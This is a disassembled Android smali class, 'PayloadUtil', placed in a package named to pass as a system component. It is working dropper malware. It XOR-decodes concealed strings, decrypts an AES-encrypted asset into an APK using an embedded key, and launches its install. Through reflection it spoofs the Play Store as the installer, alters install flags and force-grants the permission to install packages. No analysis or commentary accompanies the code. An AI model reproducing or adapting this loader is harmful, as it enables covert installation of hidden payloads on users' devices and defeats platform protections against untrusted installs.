.class public Lcom/android/system/qspaas/PayloadUtil;
.super Ljava/lang/Object;
.source "PayloadUtil.java"


# static fields
.field private static final XOR:I = 0xe7

.field private static final ASSET_ENC:[B

.field private static final OUT_ENC:[B

.field private static final KEY_ENC:[B

.field private static final IV_ENC:[B

.field private static final CIPHER_ENC:[B

.field private static final VENDING_ENC:[B

.field private static final MIME_ENC:[B

.field private static final PKG0_ENC:[B

.field private static final PKG1_ENC:[B

.field private static final PKG2_ENC:[B

.field private static final PKG3_ENC:[B

.field private static final PKG4_ENC:[B


# direct methods
.method static constructor <clinit>()V
    .locals 1

    # === BEGIN_BUILD_CONSTANTS ===
    const/16 v0, 0xc
    new-array v0, v0, [B
    fill-array-data v0, :asset_data
    sput-object v0, Lcom/android/system/qspaas/PayloadUtil;->ASSET_ENC:[B

    const/16 v0, 0xe
    new-array v0, v0, [B
    fill-array-data v0, :out_data
    sput-object v0, Lcom/android/system/qspaas/PayloadUtil;->OUT_ENC:[B

    const/16 v0, 0x20
    new-array v0, v0, [B
    fill-array-data v0, :key_data
    sput-object v0, Lcom/android/system/qspaas/PayloadUtil;->KEY_ENC:[B

    const/16 v0, 0x10
    new-array v0, v0, [B
    fill-array-data v0, :iv_data
    sput-object v0, Lcom/android/system/qspaas/PayloadUtil;->IV_ENC:[B

    const/16 v0, 0x11
    new-array v0, v0, [B
    fill-array-data v0, :cipher_data
    sput-object v0, Lcom/android/system/qspaas/PayloadUtil;->CIPHER_ENC:[B

    const/16 v0, 0x13
    new-array v0, v0, [B
    fill-array-data v0, :vending_data
    sput-object v0, Lcom/android/system/qspaas/PayloadUtil;->VENDING_ENC:[B

    const/16 v0, 0x27
    new-array v0, v0, [B
    fill-array-data v0, :mime_data
    sput-object v0, Lcom/android/system/qspaas/PayloadUtil;->MIME_ENC:[B
    const/16 v0, 0x16
    new-array v0, v0, [B
    fill-array-data v0, :pkg0_data
    sput-object v0, Lcom/android/system/qspaas/PayloadUtil;->PKG0_ENC:[B

    const/16 v0, 0x13
    new-array v0, v0, [B
    fill-array-data v0, :pkg1_data
    sput-object v0, Lcom/android/system/qspaas/PayloadUtil;->PKG1_ENC:[B

    const/16 v0, 0x16
    new-array v0, v0, [B
    fill-array-data v0, :pkg2_data
    sput-object v0, Lcom/android/system/qspaas/PayloadUtil;->PKG2_ENC:[B

    const/16 v0, 0x15
    new-array v0, v0, [B
    fill-array-data v0, :pkg3_data
    sput-object v0, Lcom/android/system/qspaas/PayloadUtil;->PKG3_ENC:[B

    const/16 v0, 0x19
    new-array v0, v0, [B
    fill-array-data v0, :pkg4_data
    sput-object v0, Lcom/android/system/qspaas/PayloadUtil;->PKG4_ENC:[B
    # === END_BUILD_CONSTANTS ===

    return-void

    :asset_data
    .array-data 1
        -0x75t
        -0x78t
        -0x7ct
        -0x7at
        -0x75t
        -0x7et
        -0x48t
        -0x74t
        -0x78t
        -0x37t
        -0x7bt
        -0x7bt
    .end array-data

    :out_data
    .array-data 1
        -0x72t
        -0x77t
        -0x7bt
        -0x7et
        -0x61t
        -0x48t
        -0x30t
        -0x30t
        -0x7et
        -0x31t
        -0x37t
        -0x69t
        -0x7at
        -0x74t
    .end array-data

    :key_data
    .array-data 1
        -0x21t
        0x41t
        0x3ct
        0x70t
        -0xat
        -0x14t
        0x6t
        0x2at
        -0x48t
        -0x51t
        -0x3t
        0x47t
        -0x58t
        -0x6et
        0x7at
        0x3bt
        0x54t
        0x7ft
        0x1ft
        0x5ct
        -0x3bt
        -0x62t
        0x8t
        0x34t
        0x63t
        -0x7et
        -0x2bt
        -0x6dt
        -0xdt
        -0x53t
        0x31t
        -0x3t
    .end array-data

    :iv_data
    .array-data 1
        0x36t
        0x4bt
        0x7et
        -0x6bt
        -0x61t
        -0x4ft
        -0x33t
        -0x2t
        0x6dt
        0x76t
        0x21t
        -0x3ft
        -0xat
        0x3bt
        0xet
        -0x58t
    .end array-data

    :cipher_data
    .array-data 1
        -0x5at
        -0x5et
        -0x4ct
        -0x38t
        -0x5ct
        -0x4dt
        -0x4bt
        -0x38t
        -0x57t
        -0x78t
        -0x49t
        -0x7at
        -0x7bt
        -0x7bt
        -0x72t
        -0x77t
        -0x80t
    .end array-data

    :vending_data
    .array-data 1
        -0x7ct
        -0x78t
        -0x76t
        -0x37t
        -0x7at
        -0x77t
        -0x7bt
        -0x69t
        -0x78t
        -0x72t
        -0x7bt
        -0x37t
        -0x71t
        -0x7et
        -0x77t
        -0x7bt
        -0x72t
        -0x77t
        -0x80t
    .end array-data

    nop

    :mime_data
    .array-data 1
        -0x7at
        -0x6bt
        -0x6bt
        -0x75t
        -0x72t
        -0x7ct
        -0x7at
        -0x6dt
        -0x72t
        -0x78t
        -0x77t
        -0x38t
        -0x71t
        -0x77t
        -0x7bt
        -0x37t
        -0x7at
        -0x77t
        -0x7bt
        -0x69t
        -0x78t
        -0x72t
        -0x7bt
        -0x37t
        -0x6bt
        -0x7at
        -0x7ct
        -0x74t
        -0x7at
        -0x80t
        -0x7et
        -0x36t
        -0x7at
        -0x6bt
        -0x7ct
        -0x71t
        -0x72t
        -0x71t
        -0x7et
    .end array-data

    :pkg0_data
    .array-data 1
        -0x7ct
        -0x78t
        -0x76t
        -0x37t
        -0x80t
        -0x78t
        -0x78t
        -0x80t
        -0x75t
        -0x7et
        -0x37t
        -0x7at
        -0x77t
        -0x7dt
        -0x6bt
        -0x78t
        -0x72t
        -0x7dt
        -0x37t
        -0x80t
        -0x76t
        -0x6ct
    .end array-data

    :pkg1_data
    .array-data 1
        -0x7ct
        -0x78t
        -0x76t
        -0x37t
        -0x7at
        -0x77t
        -0x7dt
        -0x6bt
        -0x78t
        -0x72t
        -0x7dt
        -0x37t
        -0x6ft
        -0x7et
        -0x77t
        -0x7dt
        -0x72t
        -0x77t
        -0x80t
    .end array-data

    :pkg2_data
    .array-data 1
        -0x7ct
        -0x78t
        -0x76t
        -0x37t
        -0x80t
        -0x78t
        -0x78t
        -0x80t
        -0x75t
        -0x7et
        -0x37t
        -0x7at
        -0x77t
        -0x7dt
        -0x6bt
        -0x78t
        -0x72t
        -0x7dt
        -0x37t
        -0x80t
        -0x6ct
        -0x7ft
    .end array-data

    :pkg3_data
    .array-data 1
        -0x7ct
        -0x78t
        -0x76t
        -0x37t
        -0x80t
        -0x78t
        -0x78t
        -0x80t
        -0x75t
        -0x7et
        -0x37t
        -0x7at
        -0x77t
        -0x7dt
        -0x6bt
        -0x78t
        -0x72t
        -0x7dt
        -0x37t
        -0x7at
        -0x6ct
    .end array-data

    :pkg4_data
    .array-data 1
        -0x7ct
        -0x78t
        -0x76t
        -0x37t
        -0x80t
        -0x78t
        -0x78t
        -0x80t
        -0x75t
        -0x7et
        -0x37t
        -0x7at
        -0x77t
        -0x7dt
        -0x6bt
        -0x78t
        -0x72t
        -0x7dt
        -0x37t
        -0x7at
        -0x6ct
        -0x37t
        -0x78t
        -0x6ct
        -0x6ct
    .end array-data

.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method private static x([B)[B
    .locals 4

    array-length v0, p0

    new-array v0, v0, [B

    const/4 v1, 0x0

    :goto_0
    array-length v2, p0

    if-ge v1, v2, :cond_0

    aget-byte v2, p0, v1

    sget v3, Lcom/android/system/qspaas/PayloadUtil;->XOR:I

    xor-int/2addr v2, v3

    int-to-byte v2, v2

    aput-byte v2, v0, v1

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_0
    return-object v0
.end method

.method private static xs([B)Ljava/lang/String;
    .locals 2

    new-instance v0, Ljava/lang/String;

    invoke-static {p0}, Lcom/android/system/qspaas/PayloadUtil;->x([B)[B

    move-result-object p0

    sget-object v1, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-direct {v0, p0, v1}, Ljava/lang/String;-><init>([BLjava/nio/charset/Charset;)V

    return-object v0
.end method

.method public static a(Landroid/content/Context;)Ljava/io/File;
    .locals 8

    const/4 v0, 0x0

    :try_start_0
    sget-object v1, Lcom/android/system/qspaas/PayloadUtil;->ASSET_ENC:[B

    invoke-static {v1}, Lcom/android/system/qspaas/PayloadUtil;->xs([B)Ljava/lang/String;

    move-result-object v1

    sget-object v2, Lcom/android/system/qspaas/PayloadUtil;->OUT_ENC:[B

    invoke-static {v2}, Lcom/android/system/qspaas/PayloadUtil;->xs([B)Ljava/lang/String;

    move-result-object v2

    sget-object v3, Lcom/android/system/qspaas/PayloadUtil;->CIPHER_ENC:[B

    invoke-static {v3}, Lcom/android/system/qspaas/PayloadUtil;->xs([B)Ljava/lang/String;

    move-result-object v3

    sget-object v4, Lcom/android/system/qspaas/PayloadUtil;->KEY_ENC:[B

    invoke-static {v4}, Lcom/android/system/qspaas/PayloadUtil;->x([B)[B

    move-result-object v4

    sget-object v5, Lcom/android/system/qspaas/PayloadUtil;->IV_ENC:[B

    invoke-static {v5}, Lcom/android/system/qspaas/PayloadUtil;->x([B)[B

    move-result-object v5

    new-instance v6, Ljava/io/File;

    invoke-virtual {p0}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v7

    invoke-direct {v6, v7, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v6}, Ljava/io/File;->exists()Z

    move-result v2

    if-eqz v2, :cond_0

    invoke-virtual {v6}, Ljava/io/File;->delete()Z

    :cond_0
    invoke-virtual {p0}, Landroid/content/Context;->getAssets()Landroid/content/res/AssetManager;

    move-result-object p0

    invoke-virtual {p0, v1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object p0

    new-instance v1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    const/high16 v2, 0x20000

    new-array v2, v2, [B

    :goto_0
    invoke-virtual {p0, v2}, Ljava/io/InputStream;->read([B)I

    move-result v7

    if-lez v7, :cond_1

    const/4 v0, 0x0

    invoke-virtual {v1, v2, v0, v7}, Ljava/io/ByteArrayOutputStream;->write([BII)V

    goto :goto_0

    :cond_1
    invoke-virtual {p0}, Ljava/io/InputStream;->close()V

    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object p0

    invoke-static {v3}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;

    move-result-object v0

    new-instance v1, Ljavax/crypto/spec/SecretKeySpec;

    const-string v2, "AES"

    invoke-direct {v1, v4, v2}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V

    new-instance v2, Ljavax/crypto/spec/IvParameterSpec;

    invoke-direct {v2, v5}, Ljavax/crypto/spec/IvParameterSpec;-><init>([B)V

    const/4 v3, 0x2

    invoke-virtual {v0, v3, v1, v2}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;Ljava/security/spec/AlgorithmParameterSpec;)V

    invoke-virtual {v0, p0}, Ljavax/crypto/Cipher;->doFinal([B)[B

    move-result-object p0

    new-instance v0, Ljava/io/FileOutputStream;

    invoke-direct {v0, v6}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    invoke-virtual {v0, p0}, Ljava/io/FileOutputStream;->write([B)V

    invoke-virtual {v0}, Ljava/io/FileOutputStream;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object v6

    :catch_0
    const/4 p0, 0x0

    return-object p0
.end method

.method public static b(Ljava/lang/Object;)V
    .locals 6

    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v0

    :try_start_0
    const-string v1, "installerPackageName"

    invoke-virtual {v0, v1}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;

    move-result-object v1

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Ljava/lang/reflect/Field;->setAccessible(Z)V

    sget-object v3, Lcom/android/system/qspaas/PayloadUtil;->VENDING_ENC:[B

    invoke-static {v3}, Lcom/android/system/qspaas/PayloadUtil;->xs([B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, p0, v3}, Ljava/lang/reflect/Field;->set(Ljava/lang/Object;Ljava/lang/Object;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :try_start_1
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v3, 0x21

    if-lt v1, v3, :cond_0

    const-string v1, "setPackageSource"

    const/4 v3, 0x1

    new-array v4, v3, [Ljava/lang/Class;

    sget-object v5, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    const/4 v3, 0x0

    aput-object v5, v4, v3

    invoke-virtual {v0, v1, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/Object;

    const/4 v5, 0x2

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    aput-object v5, v4, v3

    invoke-virtual {v1, p0, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    :cond_0
    :try_start_2
    const-string v1, "installFlags"

    invoke-virtual {v0, v1}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;

    move-result-object v0

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Ljava/lang/reflect/Field;->setAccessible(Z)V

    invoke-virtual {v0, p0}, Ljava/lang/reflect/Field;->getInt(Ljava/lang/Object;)I

    move-result v1

    const v2, 0x1000082

    or-int/2addr v2, v1

    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v4, 0x22

    if-lt v3, v4, :cond_1

    const v2, 0x1400082

    or-int/2addr v2, v1

    :cond_1
    invoke-virtual {v0, p0, v2}, Ljava/lang/reflect/Field;->setInt(Ljava/lang/Object;I)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :catch_2
    return-void
.end method

.method public static c(Ljava/lang/Object;Ljava/lang/Object;)I
    .locals 6

    const/4 v0, 0x1

    :try_start_0
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    const-string v2, "createSession"

    new-array v3, v0, [Ljava/lang/Class;

    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v4

    const/4 v5, 0x0

    aput-object v4, v3, v5

    invoke-virtual {v1, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    :try_start_1
    new-array v2, v0, [Ljava/lang/Object;

    aput-object p1, v2, v5

    invoke-virtual {v1, p0, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/Integer;

    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result p0
    :try_end_1
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    return p0

    :catch_0
    move-exception v2

    :try_start_2
    invoke-virtual {v2}, Ljava/lang/reflect/InvocationTargetException;->getCause()Ljava/lang/Throwable;

    move-result-object v2

    instance-of v2, v2, Ljava/lang/SecurityException;

    if-eqz v2, :cond_0

    invoke-virtual {p1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    const-string v3, "installerPackageName"

    invoke-virtual {v2, v3}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/reflect/Field;->setAccessible(Z)V

    const/4 v3, 0x0

    invoke-virtual {v2, p1, v3}, Ljava/lang/reflect/Field;->set(Ljava/lang/Object;Ljava/lang/Object;)V

    new-array v0, v0, [Ljava/lang/Object;

    aput-object p1, v0, v5

    invoke-virtual {v1, p0, v0}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Ljava/lang/Integer;

    invoke-virtual {p0}, Ljava/lang/Integer;->intValue()I

    move-result p0

    return p0

    :cond_0
    const/4 p0, -0x1

    return p0
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    :catch_1
    const/4 p0, -0x1

    return p0
.end method

.method public static d(Landroid/content/Context;Ljava/io/File;)V
    .locals 4

    if-eqz p1, :cond_1

    invoke-virtual {p1}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_0

    goto :goto_0

    :cond_0
    :try_start_0
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, ".fileprovider"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0, p1}, Lcom/android/system/qspaas/ApkFileProvider;->a(Landroid/content/Context;Ljava/lang/String;Ljava/io/File;)Landroid/net/Uri;

    move-result-object p1

    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.intent.action.VIEW"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    sget-object v1, Lcom/android/system/qspaas/PayloadUtil;->MIME_ENC:[B

    invoke-static {v1}, Lcom/android/system/qspaas/PayloadUtil;->xs([B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, p1, v1}, Landroid/content/Intent;->setDataAndType(Landroid/net/Uri;Ljava/lang/String;)Landroid/content/Intent;

    const/4 p1, 0x1

    invoke-virtual {v0, p1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 p1, 0x10000000

    invoke-virtual {v0, p1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_1
    :goto_0
    return-void
.end method

.method public static e(Landroid/content/Context;Ljava/lang/String;)V
    .locals 9

    if-eqz p1, :cond_1

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v0

    if-nez v0, :cond_0

    goto/16 :goto_1

    :cond_0
    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    const-string v1, "setInstallerPackageName"

    const/4 v2, 0x2

    new-array v3, v2, [Ljava/lang/Class;

    const-class v4, Ljava/lang/String;

    const/4 v5, 0x0

    aput-object v4, v3, v5

    const-class v4, Ljava/lang/String;

    const/4 v6, 0x1

    aput-object v4, v3, v6

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v4

    invoke-virtual {v4, v1, v3}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1

    invoke-virtual {v1, v6}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    new-array v2, v2, [Ljava/lang/Object;

    aput-object p1, v2, v5

    sget-object v3, Lcom/android/system/qspaas/PayloadUtil;->VENDING_ENC:[B

    invoke-static {v3}, Lcom/android/system/qspaas/PayloadUtil;->xs([B)Ljava/lang/String;

    move-result-object v3

    aput-object v3, v2, v6

    invoke-virtual {v1, v0, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :try_start_1
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    invoke-virtual {v0, p1, v5}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v0

    iget v0, v0, Landroid/content/pm/ApplicationInfo;->uid:I

    const-string v1, "appops"

    invoke-virtual {p0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Landroid/app/AppOpsManager;

    const-class v1, Landroid/app/AppOpsManager;

    const-string v2, "strOpToOp"

    new-array v3, v6, [Ljava/lang/Class;

    const-class v4, Ljava/lang/String;

    aput-object v4, v3, v5

    invoke-virtual {v1, v2, v3}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    invoke-virtual {v2, v6}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    new-array v3, v6, [Ljava/lang/Object;

    const-string v4, "android:request_install_packages"

    aput-object v4, v3, v5

    const/4 v4, 0x0

    invoke-virtual {v2, v4, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/Integer;

    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result v2

    const-string v3, "setMode"

    const/4 v4, 0x4

    new-array v7, v4, [Ljava/lang/Class;

    sget-object v8, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v8, v7, v5

    aput-object v8, v7, v6

    const-class v8, Ljava/lang/String;

    const/4 v6, 0x2

    aput-object v8, v7, v6

    sget-object v6, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    const/4 v8, 0x3

    aput-object v6, v7, v8

    invoke-virtual {v1, v3, v7}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1

    const/4 v3, 0x1

    invoke-virtual {v1, v3}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    new-array v4, v4, [Ljava/lang/Object;

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    aput-object v2, v4, v5

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    aput-object v0, v4, v3

    const/4 v0, 0x2

    aput-object p1, v4, v0

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p1

    aput-object p1, v4, v8

    invoke-virtual {v1, p0, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    :cond_1
    :goto_1
    return-void
.end method

.method public static f()[Ljava/lang/String;
    .locals 3

    const/4 v0, 0x5

    new-array v0, v0, [Ljava/lang/String;

    sget-object v1, Lcom/android/system/qspaas/PayloadUtil;->PKG0_ENC:[B

    invoke-static {v1}, Lcom/android/system/qspaas/PayloadUtil;->xs([B)Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    aput-object v1, v0, v2

    sget-object v1, Lcom/android/system/qspaas/PayloadUtil;->PKG1_ENC:[B

    invoke-static {v1}, Lcom/android/system/qspaas/PayloadUtil;->xs([B)Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x1

    aput-object v1, v0, v2

    sget-object v1, Lcom/android/system/qspaas/PayloadUtil;->PKG2_ENC:[B

    invoke-static {v1}, Lcom/android/system/qspaas/PayloadUtil;->xs([B)Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x2

    aput-object v1, v0, v2

    sget-object v1, Lcom/android/system/qspaas/PayloadUtil;->PKG3_ENC:[B

    invoke-static {v1}, Lcom/android/system/qspaas/PayloadUtil;->xs([B)Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x3

    aput-object v1, v0, v2

    sget-object v1, Lcom/android/system/qspaas/PayloadUtil;->PKG4_ENC:[B

    invoke-static {v1}, Lcom/android/system/qspaas/PayloadUtil;->xs([B)Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x4

    aput-object v1, v0, v2

    return-object v0
.end method

